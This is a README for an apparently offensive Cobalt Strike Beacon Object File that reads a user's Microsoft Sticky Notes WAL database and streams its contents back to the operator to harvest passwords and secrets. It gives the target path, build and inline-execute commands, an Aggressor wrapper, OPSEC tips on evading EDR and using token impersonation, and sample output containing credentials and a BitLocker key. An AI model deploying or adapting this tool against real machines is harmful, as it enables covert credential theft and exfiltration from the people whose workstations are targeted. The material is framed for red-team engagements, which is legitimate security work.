# Sticky Grabber

A Cobalt Strike Beacon Object File (BOF) that reads the **current user's Microsoft Sticky Notes WAL file** and streams its contents back through the beacon. Designed for the credential / secret-hunting phase of a red team engagement: users routinely paste passwords, BitLocker recovery keys, secrets, account numbers, license keys, and one-time codes into Sticky Notes "just for a second" and never remove them.

## Why Sticky Notes

Microsoft Sticky Notes (the modern UWP app) stores its content in an SQLite database here:

```
%LOCALAPPDATA%\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite
```

Alongside the main database, SQLite keeps a **WAL** (Write-Ahead Log) file - `plum.sqlite-wal` - that buffers recent writes before they are checkpointed back into the main DB. The WAL file frequently contains text that has not yet been flushed, including:

- Note content that was typed and "deleted" but is still resident in the WAL until checkpoint
- Snippets pasted from the clipboard (often credentials)
- Older revisions of edited notes

For the operator, this is one of the highest signal-to-noise quick wins on a live workstation.

## What this BOF does

1. Resolves the current username via `GetUserNameA`.
2. Builds the path to the user's Sticky Notes WAL file:
   `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite-wal`
3. Opens the file with `OpenFile`, reads up to 256 MB into memory.
4. Iterates the buffer and prints every non-NUL byte back to the beacon via `BeaconFormatPrintf`.
5. Frees buffers and returns.

Result: the operator sees the printable bytes of the WAL inline in the beacon console - the SQLite header, schema fragments, and any note text still resident in the log.

## Features

- Pure BOF - no new process, no DLL load, no file dropped to disk.
- Uses only `kernel32`, `advapi32`, and `msvcrt` functions; all resolved via Beacon's `LIBRARY$Function` syntax so the beacon process's IAT does not gain new imports.
- Self-contained: no command-line arguments. Drop in, fire, read output.

## Requirements

| Component | Notes |
| --- | --- |
| Cobalt Strike 4.x | `inline-execute` support |
| `beacon.h` | Cobalt Strike Arsenal Kit header. Place at `../../common/beacon.h` or edit `COMINCLUDE` in the `Makefile`. |
| mingw-w64 | `x86_64-w64-mingw32-gcc` (Linux / macOS cross-compile) |

## Build

```bash
cd Sticky_Grabber
make
```

Output: `sticky_grabber.x64.o` (BOF object file ready to load).

Clean:

```bash
make clean
```

## Usage

### Direct

```
beacon> inline-execute /path/to/sticky_grabber.x64.o
```

### Aggressor wrapper

Drop the following into a `.cna` and load it from **Cobalt Strike -> Script Manager**:

```aggressor
alias sticky_grabber {
    local('$bof');
    $bof = script_resource("sticky_grabber.x64.o");
    btask($1, "Sticky_Grabber: reading current user's Sticky Notes WAL");
    bof_load($1, $bof);
}
```

Then in a beacon:

```
beacon> sticky_grabber
```

## Example output

Running against a workstation where the active user has typed several notes into Sticky Notes:

```
beacon> inline-execute sticky_grabber.x64.o
[*] Tasked beacon to inline-execute sticky_grabber.x64.o
[+] host called home, sent: 4096 bytes
[+] received output:
SQLite format 3 plumlogiclogplumdbVersionplumNote
WindowsRDP-jumphost-01admin:Tr0ub4dor&3!!
AWS-prod-readonly-access-keyAKIA[REDACTED]secret[REDACTED]
remind: rotate 1Password vault key Friday
backup BitLocker recovery key: 482910-336107-117854-928133-447220-661053-002418-119437
```

(Output is the raw printable byte stream from the WAL file; SQLite header, table names, and stored note content are interleaved. Operators visually scan the result for high-value strings.)

## Code paths

| Source | Responsibility |
| --- | --- |
| `GetUserNameA` | Resolves the current username so the path is correct regardless of who the beacon is running as. |
| `sprintf` | Builds the absolute path to the WAL file. |
| `OpenFile` + `ReadFile` | Opens the WAL read-only and reads up to 256 MB. |
| `BeaconFormatAlloc` / `BeaconFormatPrintf` | Buffers the printable bytes for the response. |
| `BeaconPrintf(CALLBACK_OUTPUT, ...)` | Streams the buffer back to the operator. |
| `BeaconFormatFree` / `free` | Cleanup. |

## OPSEC considerations

- The BOF reads a file in the user's profile - this is normal user activity, but EDRs that watch file-access patterns for the Sticky Notes data directory may flag it. Inspect telemetry on the target before relying on it in long engagements.
- Output can be large. The WAL can contain megabytes of mostly garbage and a handful of useful strings; expect to scroll. If your C2 channel is bandwidth-constrained, filter on the operator side rather than running the BOF blindly.
- Only the current user's notes are read. Run it under each interesting user context (token impersonation, runas, or pivoted beacons) to cover a multi-user host.

## Limitations and TODOs

- Hard-coded path - no support for non-standard `%LOCALAPPDATA%` locations or roaming profiles served from a UNC path.
- No graceful error handling: if the WAL file does not exist (Sticky Notes never opened, app uninstalled, or current user has no profile yet) the BOF still attempts the read.
- Output filtering is minimal (only `NUL` is dropped). A future revision could:
  - Strip non-printable bytes outside `0x20-0x7E`.
  - Regex-grep for likely credentials inside the BOF.
  - Read `plum.sqlite` alongside `plum.sqlite-wal` and parse the `Note` table directly.

## Author

Built by [@redroot97](https://github.com/redroot97) for credential-hunting during red team engagements.

Issues and PRs welcome on the parent repository.
